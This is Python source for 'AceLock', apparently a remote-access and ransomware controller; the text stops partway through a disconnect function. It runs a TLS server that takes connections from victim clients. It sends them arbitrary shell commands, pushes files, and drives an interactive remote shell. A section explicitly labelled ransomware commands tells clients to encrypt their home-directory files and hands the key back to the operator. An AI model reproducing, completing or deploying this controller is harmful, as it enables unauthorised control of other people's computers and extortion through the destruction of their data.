import cmd
import shlex
import argparse
import threading
import socket
import sys
import time
import atexit
import os
import logging
import ssl # Import needed for potential SSLError
from time import sleep

# --- Basic Logging Setup ---
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(threadName)s - %(levelname)s - %(message)s',
                    handlers=[logging.FileHandler("commandshell.log"),
                              logging.StreamHandler(sys.stdout)])


# Ensure 'server.py' contains the corrected TC
try:
    from server import TCPServer
except ImportError:
    logging.critical("Failed to import TCPServer from server.py. Please ensure it exists and is correct.")
    # Provide a dummy class to prevent NameError if import fails
    class TCPServer:
        def __init__(self, *args, **kwargs): logging.error("TCPServer Dummy Loaded"); pass
        def start(self, *args): pass # Dummy needs to accept event arg
        def stop(self): pass
        def get_clients(self): return {}
        def disconnect_client(self, *args): return False
        def send_file(self, *args): return False


def intro():
    # (Keep your cool ASCII art intro)
    print("""
        ⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⠟⠻⣿⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⢁⠀⢠⣾⣿⣿⣿⣷⣦⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣾⣿⣀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⠿⠿⠛⠁⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⡿⠋⡉⠀⠀⢀⣤⣶⠀⢹⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀
⠀⠀⠀⠀⠀⢀⣼⣿⣿⡿⠀⣾⡇⠀⠀⣹⡿⠿⠀⠀⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀
⠀⠀⠀⠀⢀⣾⣿⣿⣿⣷⡀⢻⣿⣷⠶⣿⠁⠀⠀⡀⢸⣿⣿⣿⣿⠋⠀⠀⠀⠀
⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣷⣦⠤⠀⠀⢻⣿⣶⣾⠃⣸⣿⣿⡿⠃⠀⠀⠀⠀⠀
⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣯⣁⠀⠀⣴⣤⣉⣉⣡⣴⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠉⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠙⠻⢿⣿⣿⣿⣿⠇⠀⢋⣠⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣿⣄⣠⣾⣿⠃⠀⠀
                    AceLock by Efeturi Onobrakpeya
    """)
    logging.info("AceLock Command Shell Initialized")

class CommandShell(cmd.Cmd):
    def __init__(self, certfile='../ssl_deets/server.crt', keyfile='../ssl_deets/server.key'):
        super().__init__()
        self.intro = intro()
        self.prompt = 'AceLock> '
        self.server_object = None
        # Store selected client info
        self.current_client_socket = None
        self.current_client_address = None
        self.server_thread = None
        self.server_running = False
        self._lock = threading.Lock() # Lock for server_running state
        # Event for server startup synchronization <<-- Added
        self.server_started_event = threading.Event()
        # Store cert/key paths
        self.certfile = certfile
        self.keyfile = keyfile

        atexit.register(self.cleanup)

    def cleanup(self):
        """Ensure server is properly stopped when program exits."""
        if self.server_running: # Quick check
            with self._lock: # Check again under lock
                if self.server_running and self.server_object:
                    logging.info("Performing cleanup via atexit...")
                    try:
                        self.server_object.stop() # Use server's graceful stop
                        self.server_running = False
                        logging.info("Server stop requested during cleanup.")
                    except Exception as e:
                        logging.error(f"Error during server stop in cleanup: {e}", exc_info=True)

    def do_start_server(self, args):
        """
        Start the secure TCP server with specified host, port, and certs.
        Usage: start_server [-host HOST] [-port PORT] [-cert CERTFILE] [-key KEYFILE]
        """
        with self._lock:
            if self.server_running:
                logging.warning("Start command issued, but server is already running.")
                print("[!] Server is already running")
                return

        parser = argparse.ArgumentParser(description='Start the secure server')
        parser.add_argument('-host', default='0.0.0.0', help='Server host address')
        parser.add_argument('-port', type=int, default=8000, help='Server port number')
        # Use instance variables as defaults for cert/key <<-- Changed
        parser.add_argument('-cert', default=self.certfile, help='Path to SSL certificate file')
        parser.add_argument('-key', default=self.keyfile, help='Path to SSL key file')

        try:
            parsed_args = parser.parse_args(shlex.split(args))

            # Validate cert/key paths
            if not os.path.isfile(parsed_args.cert):
                logging.error(f"Certificate file not found: {parsed_args.cert}")
                print(f"[!] Certificate file not found: {parsed_args.cert}")
                return
            if not os.path.isfile(parsed_args.key):
                logging.error(f"Key file not found: {parsed_args.key}")
                print(f"[!] Key file not found: {parsed_args.key}")
                return

            # Pass cert/key to constructor <<-- Changed
            self.server_object = TCPServer(host=parsed_args.host, port=parsed_args.port,
                                           certfile=parsed_args.cert, keyfile=parsed_args.key)
            logging.info("TCPServer object created.")

            # Reset event before starting <<-- Changed
            self.server_started_event.clear()

            # Create and start the server thread, passing the event <<-- Changed
            self.server_thread = threading.Thread(
                target=self._run_server,
                name="ServerThread",
                daemon=True
            )

            with self._lock:
                self.server_running = True # Assume it will run unless error occurs

            self.server_thread.start()
            logging.info("Server thread started, waiting for startup confirmation...")

            # Wait for the server thread to signal startup (with a timeout) <<-- Changed
            if self.server_started_event.wait(timeout=10.0): # Wait up to 10 seconds
                 with self._lock: # Re-check state after wait
                     if self.server_running:
                         logging.info(f"Server successfully started on {parsed_args.host}:{parsed_args.port}")
                         print(f"[+] Secure Server started on {parsed_args.host}:{parsed_args.port}")
                     else:
                         # Server thread started but set server_running false before signalling (error)
                         logging.error("Server thread started but reported an error during initialization.")
                         print("[!] Server thread started but reported an error during initialization.")
            else:
                # Timeout occurred
                logging.error("Server failed to start within timeout.")
                print("[!] Server failed to start within timeout.")
                with self._lock:
                    self.server_running = False # Ensure state is correct
                # Attempt cleanup if server object exists
                if self.server_object:
                    try: self.server_object.stop()
                    except: pass

        except (argparse.ArgumentError, ValueError) as e:
            logging.error(f"Invalid arguments for start_server: {e}")
            print(f"[!] Invalid arguments: {e}")
        except ImportError as e:
             logging.critical(f"Failed to import server components: {e}")
             print(f"[!] Critical Error: Could not load server code: {e}")
        except (ssl.SSLError, OSError, socket.error) as e:
             logging.error(f"Failed to initialize server socket: {e}", exc_info=True)
             print(f"[!] Error initializing server socket: {e}")
             with self._lock: self.server_running = False
        except Exception as e:
            logging.error(f"Error starting server: {e}", exc_info=True)
            print(f"[!] Error starting server: {e}")
            with self._lock:
                self.server_running = False
            self.server_object = None

    def _run_server(self):
        """Thread target function to run the server's start method."""
        try:
            # Pass the event to the server's start method <<-- Changed
            self.server_object.start(self.server_started_event)
            logging.info("Server object's start() method returned (server likely stopped).")
        except Exception as e:
            # Log errors occurring within the server's start method execution
            logging.error(f"Error within server thread execution (server.start): {e}", exc_info=True)
            # Ensure the startup event is set even on error so the main thread doesn't hang
            self.server_started_event.set()
            print(f"\n[!] Server Error: {e}")
        finally:
            with self._lock:
                self.server_running = False
            logging.info("Server thread finished.")
            # Ensure event is set if loop terminates unexpectedly
            if not self.server_started_event.is_set():
                 self.server_started_event.set()
            # Clear selection if server stops
            self._clear_current_client() # Use helper
            print("\n[*] Server has stopped. Client selection cleared.")

    def _verify_selected_client_connected(self) -> bool:
        """Checks if the currently selected client is still in the server's list."""
        if not self.current_client_address or not self.server_object:
            # No client selected, or server stopped in meantime
            return False
        try:
            clients_data = self.server_object.get_clients()
            if self.current_client_address not in clients_data:
                print("[!] Current client seems to have disconnected. Select another client.")
                self._clear_current_client()
                return False
            # Refresh socket object just in case (unlikely necessary but safe)
            self.current_client_socket = clients_data[self.current_client_address][0]
            return True
        except AttributeError:
            print("[!] Error accessing server's client getter for verification.")
            return False
        except Exception as e:
            print(f"[!] Error verifying client connection: {e}")
            return False


    def do_server_status(self, args):
        """
        Display the current status of the server.
        Usage: server_status
        """
        with self._lock:
            is_running = self.server_running

        if is_running and self.server_object:
            print("[+] Server Status: Running")
            host = getattr(self.server_object, 'host', 'N/A')
            port = getattr(self.server_object, 'port', 'N/A')
            print(f"    Listening on: {host}:{port}")
            try:
                # Use the safe getter method <<-- Changed
                client_count = len(self.server_object.get_clients())
                print(f"    Connected clients: {client_count}")
            except AttributeError:
                print("    Connected clients: Error accessing client getter (is server object correct?).")
            except Exception as e:
                 print(f"    Connected clients: Error ({e})")
            print("    Security: TLS Enabled (Verify server.py)")
            print("              (No Client Authentication Handled by Shell)")
        else:
            print("[+] Server Status: Stopped")

    def do_list_clients(self, args):
        """
        List all connected clients with their addresses and connection details.
        Usage: list_clients
        """
        if not self.server_running or not self.server_object:
            logging.warning("list_clients attempted while server not running.")
            print("[!] Server not running. Use start_server first.")
            return

        try:
            # Use the safe getter method <<-- Changed
            clients_data = self.server_object.get_clients()
        except AttributeError:
            print("[!] Error accessing server's client getter (is server object correct?).")
            return
        except Exception as e:
             print(f"[!] Error getting client list: {e}")
             return

        if not clients_data:
            print("[!] No clients connected.")
            return

        print("\nConnected Clients:")
        print("==================")
        i = 0
        # clients_data is a copy, safe to iterate
        for address, client_info in clients_data.items(): # <<-- Changed iteration
            i += 1
            # Unpack the tuple from the dictionary value <<-- Changed
            client_socket, connection_time = client_info

            # Check if this is the current client using the stored address
            current = " (current)" if self.current_client_address and self.current_client_address == address else ""

            ip, port = address

            # Get socket details (basic)
            try:
                socket_family_str = socket.AF_INET6 if client_socket.family == socket.AF_INET6 else socket.AF_INET
                is_encrypted = "Yes (TLS)" # Server forces TLS
            except AttributeError: # Socket might be closed or invalid
                socket_family_str = "Unknown"
                is_encrypted = "Unknown"

            # Format connection time from stored timestamp <<-- Changed
            try:
                connection_time_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(connection_time))
            except:
                connection_time_str = "Unknown"

            print(f"{i}. Client: {ip}:{port}{current}")
            print(f"   Address Family: {socket_family_str}")
            print(f"   Encrypted: {is_encrypted}")
            print(f"   Connected since: {connection_time_str}") #<<-- Corrected Time
            print("-" * 18)

        print(f"Total clients: {len(clients_data)}")
        print()

    def do_send_file(self, args):
        """
        Send a file using the server's send_file method.
        Usage: send_file <local_file_path> [client_index]
        Example: send_file /path/to/local/file.txt
        Example: send_file C:\\Users\\Admin\\doc.txt 1
        """
        if not self.server_running or not self.server_object:
            logging.warning("send_file attempted while server not running.")
            print("[!] Server not running. Use start_server first.")
            return

        try:
            # Use getter for client data <<-- Changed
            clients_data = self.server_object.get_clients()
        except AttributeError:
             print("[!] Error accessing server's client getter.")
             return

        if not clients_data:
            print("[!] No clients connected.")
            return

        try:
            args_list = shlex.split(args)
            if not 1 <= len(args_list) <= 2:
                print("[!] Usage: send_file <local_file_path> [client_index]")
                return

            local_file_path = args_list[0]
            target_client_address = None

            if len(args_list) == 2: # Client index provided
                try:
                    client_index = int(args_list[1])
                    if not 1 <= client_index <= len(clients_data):
                        print(f"[!] Invalid client index. Must be between 1 and {len(clients_data)}")
                        return
                    # Get address from index (safe as clients_data is a copy)
                    target_client_address = list(clients_data.keys())[client_index - 1]
                except ValueError:
                    print("[!] Client index must be a number.")
                    return
                except IndexError:
                     print("[!] Client index out of range (client list might have changed). Try list_clients again.")
                     return
            else: # Use currently selected client
                if not self.current_client_address:
                    print("[!] No client selected. Use select_client first or specify a client index.")
                    return
                # Verify the selected client is still connected
                if self.current_client_address not in clients_data:
                     print("[!] Current client seems to have disconnected. Select another client.")
                     self._clear_current_client()
                     return
                target_client_address = self.current_client_address

            if not os.path.isfile(local_file_path):
                logging.error(f"File not found for sending: {local_file_path}")
                print(f"[!] Local file not found: {local_file_path}")
                return

            target_ip, target_port = target_client_address
            logging.info(f"Requesting server to send file '{local_file_path}' to client {target_ip}:{target_port}")
            print(f"[*] Requesting server send file '{local_file_path}' to client {target_ip}:{target_port}...")

            # Call the server's send_file method - API matches <<-- No change needed here
            success = self.server_object.send_file(local_file_path, target_client_address)
            # Check return value <<-- Added
            if success:
                 print(f"[+] Server reported file sent successfully to {target_ip}:{target_port}.")
                 logging.info(f"Server call send_file succeeded for {local_file_path} to {target_ip}:{target_port}")
            else:
                 print(f"[!] Server reported failure to send file to {target_ip}:{target_port}. Check server logs.")
                 logging.warning(f"Server call send_file failed for {local_file_path} to {target_ip}:{target_port}")

        except (ValueError, IndexError, argparse.ArgumentError) as e:
             logging.error(f"Argument error in send_file: {e}")
             print(f"[!] Error processing arguments: {e}")
        except AttributeError as e:
             logging.error(f"Missing method/attribute on server object: {e}")
             print(f"[!] Server object error: {e}. Is server.py correct?")
        except Exception as e:
            logging.error(f"Error sending file: {e}", exc_info=True)
            print(f"[!] Error sending file: {e}")

    def do_cmd(self, args):
        """
        Send a command for execution to the currently selected client.
        Usage: cmd <command_and_args>
        Example: cmd whoami
        Example: cmd ls -la /tmp
        """
        # <<-- MAJOR CHANGES HERE -->>
        if not self.server_running or not self.server_object:
            logging.warning("cmd attempted while server not running.")
            print("[!] Server not running. Use start_server first.")
            return

        # Check if a client is selected (needs socket)
        if not self.current_client_socket or not self.current_client_address:
            print("[!] No client selected. Use select_client first.")
            return

        # Verify the selected client is still connected using getter
        try:
            clients_data = self.server_object.get_clients()
            if self.current_client_address not in clients_data:
                 print("[!] Current client seems to have disconnected. Select another client.")
                 self._clear_current_client()
                 return
            # Refresh socket object just in case (though unlikely necessary with this server design)
            self.current_client_socket = clients_data[self.current_client_address][0]
        except AttributeError:
            print("[!] Error accessing server's client getter for verification.")
            return # Cannot verify, safer to stop

        if not args:
            print("[!] No command provided. Usage: cmd <command_and_args>")
            return

        ip, port = self.current_client_address
        logging.info(f"Sending command directly to {ip}:{port}: {args}")
        print(f"[*] Sending command to client {ip}:{port}: {args}")

        try:
            # Define prefix for single command execution (client needs to expect this)
            command_to_send = f"EXEC {args}\n"

            # Send directly using the stored socket
            self.current_client_socket.sendall(command_to_send.encode('utf-8'))

            # Receive the entire response using helper method
            print("[*] Waiting for response...")
            output_bytes = self._receive_all(self.current_client_socket, timeout=10.0) # 10 sec timeout

            if output_bytes:
                print("--- Client Output ---")
                print(output_bytes.decode('utf-8', errors='replace').strip())
                print("---------------------")
                logging.info(f"Received response from {ip}:{port} for command '{args}'")
            else:
                # _receive_all returning empty usually means disconnect handled within it
                # If it returns empty due to timeout with no data, log warning.
                 if self.current_client_address: # Check if client wasn't cleared by _receive_all->handle_disconnection
                    print("[!] No response received within timeout.")
                    logging.warning(f"No response received from {ip}:{port} for command '{args}'")


        except ConnectionResetError:
             # Error already handled by _receive_all or _handle_disconnection
             logging.warning(f"Connection reset during cmd execution for {ip}:{port}.")
        except (socket.error, ssl.SSLError, BrokenPipeError) as e:
            print(f"[!] Connection error with client {ip}:{port}: {e}")
            logging.error(f"Socket error during cmd for {ip}:{port}: {e}", exc_info=True)
            self._handle_disconnection(self.current_client_address)
        except Exception as e:
            print(f"[!] Unexpected error sending/receiving command: {e}")
            logging.error(f"Unexpected error in do_cmd for {ip}:{port}: {e}", exc_info=True)
            # Consider disconnecting on unexpected errors too
            if self.current_client_address:
                 self._handle_disconnection(self.current_client_address)

    # Renamed to use
    def do_use(self, args):
        """
        Select a client for interaction by its index. Stores selection locally.
        Usage: select_client <client_index>
        Example: select_client 1
        """
        # <<-- Changed -->>
        if not self.server_running or not self.server_object:
            logging.warning("select_client attempted while server not running.")
            print("[!] Server not running. Use start_server first.")
            return

        try:
            # Use getter <<-- Changed
            clients_data = self.server_object.get_clients()
        except AttributeError:
             print("[!] Error accessing server's client getter.")
             return

        if not clients_data:
            print("[!] No clients connected.")
            return

        try:
            if not args:
                print("[!] No client index provided. Usage: select_client <client_index>")
                return

            try:
                client_index = int(args)
                if not 1 <= client_index <= len(clients_data):
                    print(f"[!] Invalid client index. Must be between 1 and {len(clients_data)}")
                    return
            except ValueError:
                print("[!] Client index must be a number.")
                return
            except IndexError: # Should be caught by length check, but good practice
                 print("[!] Client index calculation error.")
                 return

            # Get address from index
            target_address = list(clients_data.keys())[client_index - 1]
            # Unpack tuple to get socket and timestamp <<-- Changed
            target_socket, _ = clients_data[target_address]

            # Store selection locally <<-- Changed
            self.current_client_socket = target_socket
            self.current_client_address = target_address

            # Remove call to non-existent switch_connection <<-- Changed
            # self.server_object.switch_connection(target_address)

            ip, port = target_address
            logging.info(f"Selected client {ip}:{port} (Index {client_index})")
            print(f"[+] Selected client: {ip}:{port}")
            # Update prompt
            self.prompt = f'AceLock ({ip}:{port})> '

        except (ValueError, IndexError, argparse.ArgumentError) as e:
             logging.error(f"Argument error in select_client: {e}")
             print(f"[!] Error processing arguments: {e}")
        except AttributeError as e:
             logging.error(f"Missing method/attribute on server object: {e}")
             print(f"[!] Server object error: {e}. Is server.py correct?")
        except Exception as e:
            logging.error(f"Error selecting client: {e}", exc_info=True)
            print(f"[!] Error selecting client: {e}")
            self._clear_current_client()

    def _receive_until_prompt_or_done(self, sock, timeout=5.0):
        """
        Helper to receive data until a specific condition (like a known end marker
        from the client for long operations, or just timeout). Returns aggregated bytes
        or None if disconnection occurs.
        """
        if not sock or sock._closed:
            logging.warning("_receive_until_prompt_or_done called with closed socket.")
            # Ensure disconnect handler is called if we know the address
            if self.current_client_address: self._handle_disconnection(self.current_client_address)
            return None  # Indicate disconnection
        if not isinstance(sock, socket.socket):
            logging.error("_receive_all called with non-socket object.")
            return None

        sock.settimeout(timeout)
        total_data = b''
        try:
            while True:  # Loop until timeout or explicit break
                chunk = sock.recv(4096)
                if chunk:
                    total_data += chunk
                    # Optional: Check if chunk contains end marker here if client sends one
                    # e.g., if b'\nCOMMAND_COMPLETE\n' in total_data: break
                else:
                    # Socket closed gracefully by peer
                    logging.info(
                        f"Socket recv returned empty, peer {sock.getpeername() if not sock._closed else '(closed)'} likely closed connection.")
                    raise ConnectionResetError("Peer closed connection")

        except socket.timeout:
            logging.debug(f"Socket timeout after receiving {len(total_data)} bytes in _receive_until_prompt_or_done.")
            # Timeout is expected way to exit loop when client stops sending (e.g., after command)
            pass
        except ConnectionResetError as e:
            logging.warning(f"ConnectionResetError during _receive_until_prompt_or_done: {e}")
            print(f"\n[!] Client disconnected: {e}")
            if self.current_client_address: self._handle_disconnection(self.current_client_address)
            return None  # Indicate disconnect
        except (socket.error, ssl.SSLError, OSError) as e:
            # Distinguish between "closed" errors and others
            err_str = str(e).lower()
            if sock._closed or "closed" in err_str or "broken pipe" in err_str or "reset by peer" in err_str:
                logging.warning(f"Socket error indicates closed connection during receive: {e}")
                print(f"\n[!] Client disconnected: {e}")
                if self.current_client_address: self._handle_disconnection(self.current_client_address)
                return None  # Indicate disconnect
            else:
                logging.error(f"Unexpected socket error during receive: {e}")
                print(f"\n[!] Socket Error: {e}")
                if self.current_client_address: self._handle_disconnection(self.current_client_address)
                return None  # Indicate disconnect, as state is unknown
        finally:
            try:
                if sock and not sock._closed: sock.settimeout(None)  # Reset only if still open and valid
            except (socket.error, OSError, AttributeError):
                pass  # Ignore errors setting timeout back if sock closed meanwhile

        return total_data

    def _interactive_receive_loop(self, sock, prompt):
        """Handles the input/output loop for interactive shell mode."""
        try:
            while True:
                # 1. Check for unsolicited data from client (e.g., initial prompt, command output)
                try:
                    sock.settimeout(0.1) # Short timeout to check for data
                    initial_output = sock.recv(8192)
                    if initial_output:
                         sys.stdout.write(initial_output.decode('utf-8', errors='replace'))
                         sys.stdout.flush()
                    # If recv returns empty b'', peer closed connection
                    elif initial_output == b'':
                        raise ConnectionResetError("Peer closed connection during interactive recv.")
                except socket.timeout:
                    pass # No data received, proceed to get user input
                except (ConnectionResetError, ssl.SSLError, socket.error, BrokenPipeError) as e:
                    # Handle errors during initial check
                    print(f"\n[!] Connection error receiving shell data: {e}")
                    logging.warning(f"Socket error in _interactive_receive_loop (recv): {e}")
                    self._handle_disconnection(self.current_client_address)
                    break # Exit loop

                sock.settimeout(None) # Back to blocking for input

                # 2. Get input from user
                try:
                     shell_input = input(prompt)
                except EOFError: # Handle Ctrl+D
                    print("\n[!] EOF received. Sending 'exit' to remote shell.")
                    shell_input = "exit"

                # 3. Send user input to client
                try:
                    sock.sendall((shell_input + "\n").encode('utf-8'))
                except (ssl.SSLError, socket.error, BrokenPipeError) as e:
                     print(f"\n[!] Connection error sending shell command: {e}")
                     logging.warning(f"Socket error in _interactive_receive_loop (send): {e}")
                     self._handle_disconnection(self.current_client_address)
                     break

                # 4. Check if user wants to exit
                if shell_input.lower().strip() in ["exit", "quit"]:
                     print("[+] Exiting shell mode.")
                     # Give client a moment to process exit before shell returns control
                     sleep(0.2)
                     # Optionally receive one last chunk of output?
                     # try:
                     #     sock.settimeout(0.5)
                     #     last_output = sock.recv(4096)
                     #     if last_output:
                     #          sys.stdout.write(last_output.decode('utf-8', errors='replace'))
                     #          sys.stdout.flush()
                     # except socket.timeout: pass
                     # except: pass # Ignore errors here
                     break # Exit loop

                # 5. Loop back to check for command output

        except KeyboardInterrupt:
             print("\n[!] Interrupt received. Sending newline to remote shell (try 'exit' or 'quit' to leave).")
             try:
                 sock.sendall(b'\n')
                 # Recursively call to continue the loop after interrupt
                 self._interactive_receive_loop(sock, prompt)
             except (socket.error, ssl.SSLError, BrokenPipeError):
                  print(f"\n[!] Connection error sending newline after interrupt.")
                  self._handle_disconnection(self.current_client_address)
        # Catch potential outer loop exceptions (should be caught inside ideally)
        except (ConnectionResetError, ssl.SSLError, socket.error, BrokenPipeError) as e:
             print(f"\n[!] Connection error in interactive shell: {e}")
             self._handle_disconnection(self.current_client_address)
        finally:
             try:
                  if sock and not sock._closed: sock.settimeout(None)
             except: pass
    # --- NEW RANSOMWARE COMMANDS ---

    def do_encrypt_files(self, args):
        """
        [DANGEROUS] Instructs the selected client to encrypt files in its home directory.
        Displays status and the generated encryption key. SAVE THE KEY!
        Usage: encrypt_files
        """
        print("\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!! WARNING !!!!!!_!!!!!!!!!!!!!!!!!!!!!!")
        print("!!! This command will instruct the client to encrypt files.  !!!")
        print("!!! This is potentially DESTRUCTIVE and data may be LOST     !!!")
        print("!!! permanently if the key is lost or errors occur.        !!!")
        print("!!! USE ONLY ON TEST SYSTEMS YOU ARE WILLING TO WIPE.      !!!")
        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        confirm = input("Type 'CONFIRM' to proceed, anything else to cancel: ")
        if confirm.strip().upper() != 'CONFIRM':
            print("[!] Encryption cancelled.")
            return

        if not self.server_running or not self.server_object:
            logging.warning("encrypt_files attempted while server not running.")
            print("[!] Server not running. Use start_server first.")
            return
        if not self.current_client_socket or not self.current_client_address:
            print("[!] No client selected. Use select_client first.")
            return
        if not self._verify_selected_client_connected(): return # Use helper

        ip, port = self.current_client_address
        logging.info(f"Sending ENCRYPT command to {ip}:{port}")
        print(f"[*] Sending ENCRYPT command to client {ip}:{port}...")
        print("[*] Waiting for status updates and encryption key...")
        print("[*] DO NOT INTERRUPT. SAVE THE KEY WHEN PROVIDED.")

        encryption_key = None
        try:
            command_to_send = "ENCRYPT\n"
            self.current_client_socket.sendall(command_to_send.encode('utf-8'))

            # Receive and display status until "COMPLETED" or "KEY:" prefix
            while True:
                 # Use helper with long timeout, expecting multiple messages
                 response_bytes = self._receive_until_prompt_or_done(self.current_client_socket, timeout=600.0) # 10 min timeout?

                 if response_bytes is None: # Disconnect handled by helper
                      print("[!] Client disconnected during encryption.")
                      break

                 response = response_bytes.decode('utf-8', errors='replace').strip()
                 print(f"Client {ip}:{port}: {response}") # Display status

                 # Check for key prefix
                 if response.startswith("KEY:"):
                     encryption_key = response[len("KEY:"):].strip()
                     print("\n!!!!!!!!!!!!!!!!!!!! ENCRYPTION KEY !!!!!!!!!!!!!!!!!!!!")
                     print(f"!!! Key for {ip}:{port}: {encryption_key}")
                     print("!!! SAVE THIS KEY IMMEDIATELY AND SECURELY!          !!!")
                     print("!!! WITHOUT IT, DECRYPTION IS IMPOSSIBLE.          !!!")
                     print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n")
                     logging.info(f"Received encryption key from {ip}:{port}: {encryption_key}")

                 # Check for completion message
                 if response.startswith("COMPLETED:") or response.startswith("FATAL ERROR"):
                      logging.info(f"Received final status from {ip}:{port} for ENCRYPT.")
                      if not encryption_key and "COMPLETED" in response:
                          print("[!] WARNING: Encryption completed but key was not explicitly received in final messages? Check logs.")
                      break # Exit loop on completion or fatal error

        except (socket.error, ssl.SSLError, BrokenPipeError) as e:
            print(f"\n[!] Connection error during encryption command with client {ip}:{port}: {e}")
            logging.error(f"Socket error during encrypt_files for {ip}:{port}: {e}", exc_info=True)
            self._handle_disconnection(self.current_client_address)
        except Exception as e:
            print(f"\n[!] Unexpected error during encryption command: {e}")
            logging.error(f"Unexpected error in do_encrypt_files for {ip}:{port}: {e}", exc_info=True)
            if self.current_client_address:
                 self._handle_disconnection(self.current_client_address)
        finally:
             if encryption_key:
                  print("[+] Encryption process finished or stopped. Ensure you saved the key.")
             else:
                  print("[!] Encryption process finished or stopped, but no key was confirmed. Check client logs and previous output carefully.")


    def do_decrypt_files(self, args):
        """
        [DANGEROUS] Instructs the selected client to decrypt files using the provided key.
        Usage: decrypt_files <base64_encoded_key>
        Example: decrypt_files YOUR_SAVED_KEY_HERE
        """
        print("\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!! WARNING !!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        print("!!! This command will instruct the client to decrypt files.  !!!")
        print("!!! Using the WRONG KEY may CORRUPT files further.         !!!")
        print("!!! Ensure you have the CORRECT key for this client.       !!!")
        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")

        if not args:
            print("[!] Usage: decrypt_files <base64_encoded_key>")
            print("[!] The key is the string provided after running 'encrypt_files'.")
            return

        key_b64 = args.strip()
        # Optional: Basic validation of the key format (URL-safe base64)
        try:
            key_bytes = base64.urlsafe_b64decode(key_b64)
            if len(key_bytes) != 32:
                 print("[!] Invalid key format: Decoded key length is not 32 bytes.")
                 return
        except (ValueError, base64.binascii.Error):
            print("[!] Invalid key format: Not valid URL-safe base64.")
            return

        confirm = input(f"Type 'CONFIRM' to proceed with decryption using key starting with '{key_b64[:8]}...', anything else to cancel: ")
        if confirm.strip().upper() != 'CONFIRM':
            print("[!] Decryption cancelled.")
            return

        if not self.server_running or not self.server_object:
            logging.warning("decrypt_files attempted while server not running.")
            print("[!] Server not running. Use start_server first.")
            return
        if not self.current_client_socket or not self.current_client_address:
            print("[!] No client selected. Use select_client first.")
            return
        if not self._verify_selected_client_connected(): return # Use helper

        ip, port = self.current_client_address
        logging.info(f"Sending DECRYPT command to {ip}:{port} with key {key_b64[:8]}...")
        print(f"[*] Sending DECRYPT command to client {ip}:{port}...")
        print("[*] Waiting for status updates...")

        try:
            command_to_send = f"DECRYPT {key_b64}\n"
            self.current_client_socket.sendall(command_to_send.encode('utf-8'))

            # Receive and display status until "COMPLETED"
            while True:
                 response_bytes = self._receive_until_prompt_or_done(self.current_client_socket, timeout=600.0) # Long timeout

                 if response_bytes is None: # Disconnect handled by helper
                      print("[!] Client disconnected during decryption.")
                      break

                 response = response_bytes.decode('utf-8', errors='replace').strip()
                 print(f"Client {ip}:{port}: {response}") # Display status

                 # Check for completion message
                 if response.startswith("COMPLETED:") or response.startswith("FATAL ERROR"):
                      logging.info(f"Received final status from {ip}:{port} for DECRYPT.")
                      break # Exit loop on completion or fatal error

        except (socket.error, ssl.SSLError, BrokenPipeError) as e:
            print(f"\n[!] Connection error during decryption command with client {ip}:{port}: {e}")
            logging.error(f"Socket error during decrypt_files for {ip}:{port}: {e}", exc_info=True)
            self._handle_disconnection(self.current_client_address)
        except Exception as e:
            print(f"\n[!] Unexpected error during decryption command: {e}")
            logging.error(f"Unexpected error in do_decrypt_files for {ip}:{port}: {e}", exc_info=True)
            if self.current_client_address:
                 self._handle_disconnection(self.current_client_address)
        finally:
            print("[+] Decryption process finished or stopped.")


    # --- END RANSOMWARE COMMANDS ---


    def do_disconnect_client(self, args):
        """
        Forcibly disconnect a specific client by its index using the server's method.
        Usage: disconnect_client <client_index>
        Example: disconnect_client 1
        """
        # <<-- Changed -->>
        if not self.server_running or not self.server_object:
            logging.warning("disconnect_client attempted while server not running.")
            print("[!] Server not running. Use start_server first.")
            return

        try:
             # Use getter <<-- Changed
             clients_data = self.server_object.get_clients()
        except AttributeError:
            print("[!] Error accessing server's client getter.")
            return

        if not clients_data:
            print("[!] No clients connected.")
            return

        try:
            if not args:
                print("[!] No client index provided. Usage: disconnect_client <client_index>")
                return

            try:
                client_index = int(args)
                if not 1 <= client_index <= len(clients_data):
                    print(f"[!] Invalid client index. Must be between 1 and {len(clients_data)}")
                    return
            except ValueError:
                print("[!] Client index must be a number")
                return
            except IndexError:
                 print("[!] Client index calculation error.")
                 return

            # Get address from index
            target_address = list(clients_data.keys())[client_index - 1]
            ip, port = target_address

            # Use the server's safe disconnect method <<-- Changed
            logging.info(f"Requesting server to disconnect client {ip}:{port} (Index {client_index})")
